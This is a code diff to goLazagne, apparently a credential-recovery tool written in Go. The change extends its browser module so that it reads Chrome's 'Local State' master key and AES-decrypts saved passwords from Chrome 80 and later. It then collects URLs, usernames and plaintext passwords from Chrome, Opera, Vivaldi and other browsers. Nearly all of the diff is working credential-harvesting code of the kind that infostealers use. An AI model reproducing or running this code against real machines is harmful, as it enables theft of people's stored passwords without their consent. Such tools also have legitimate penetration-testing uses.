@@ -7,6 +7,7 @@ import (
 	"github.com/kerbyj/goLazagne/common"
 	"io/ioutil"
 	"os"
+	"strings"
 )
 
 func chromeModuleStart(path string) ([]common.UrlNamePass, bool) {
@@ -18,7 +19,7 @@ func chromeModuleStart(path string) ([]common.UrlNamePass, bool) {
 		profilesWithTrash, _, _, _ := jsonparser.Get(fileWithUserData, "profile")
 
 		var profileNames []string
-
+		
 		//todo delete this piece of... is there a more smartly way?
 		jsonparser.ObjectEach(profilesWithTrash, func(key []byte, value []byte, dataType jsonparser.ValueType, offset int) error {
 			profileNames = append(profileNames, string(key))
@@ -63,18 +64,44 @@ func chromeModuleStart(path string) ([]common.UrlNamePass, bool) {
 				decryptedPassword, errUnprotectData := common.Win32CryptUnprotectData(password, false)
 
 				if errUnprotectData != nil {
-					data = append(data, common.UrlNamePass{actionUrl, username, "empty"})
+					// Chrome ver. 80+ creds extract
+					if strings.Contains(path, "\\Google\\Chrome\\User Data") {
+
+						keyFilePath := os.Getenv("USERPROFILE") + "/AppData/Local/Google/Chrome/User Data/Local State"
+						masterKey, err := common.GetMasterkey(keyFilePath)
+						if err != nil {
+							return nil, false
+						}
+
+						newVersionPassword, errAesDecrypt := common.DecryptAESPwd([]byte(password), masterKey)
+						if errAesDecrypt == nil {
+							data = append(data, common.UrlNamePass{
+								Url:      actionUrl,
+								Username: username,
+								Pass:     string(newVersionPassword),
+							})
+						} else {
+							// failed to decrypt password with both methods
+							data = append(data, common.UrlNamePass{
+								Url:      actionUrl,
+								Username: username,
+								Pass:     "empty",
+							})
+						}
+					}
 				} else {
-					data = append(data, common.UrlNamePass{Url: actionUrl, Username: username, Pass: string(decryptedPassword)})
+					data = append(data, common.UrlNamePass{
+						Url:      actionUrl,
+						Username: username,
+						Pass:     string(decryptedPassword),
+					})
 				}
 			}
-
-			// remove already used database
 			os.Remove(tmpDB)
-
 			return data, true
 		}
-	}
+			// remove already used database
+		}
 	return nil, false
 }
 
@@ -83,14 +110,14 @@ var (
 		Paths for more interesting and popular browsers for us
 	*/
 	chromePathsUserData = []string{
-		common.LocalAppData + "\\Google\\Chrome\\User Data", // Google chrome
-		common.AppData + "\\Opera Software\\Opera Stable",   // Opera
+		common.LocalAppData + "\\Google\\Chrome\\User Data",        // Google chrome
+		common.AppData + "\\Opera Software\\Opera Stable",          // Opera
 		// common.LocalAppData + "\\Yandex\\YandexBrowser\\User Data", // Yandex browser
-		common.LocalAppData + "\\Vivaldi\\User Data",          // Vivaldi
-		common.LocalAppData + "\\CentBrowser\\User Data",      // CentBrowser
-		common.LocalAppData + "\\Amigo\\User Data",            // Amigo (RIP)
-		common.LocalAppData + "\\Chromium\\User Data",         // Chromium
-		common.LocalAppData + "\\Sputnik\\Sputnik\\User Data", // Sputnik
+		common.LocalAppData + "\\Vivaldi\\User Data",               // Vivaldi
+		common.LocalAppData + "\\CentBrowser\\User Data",           // CentBrowser
+		common.LocalAppData + "\\Amigo\\User Data",                 // Amigo (RIP)
+		common.LocalAppData + "\\Chromium\\User Data",              // Chromium
+		common.LocalAppData + "\\Sputnik\\Sputnik\\User Data",      // Sputnik
 	}
 )
 
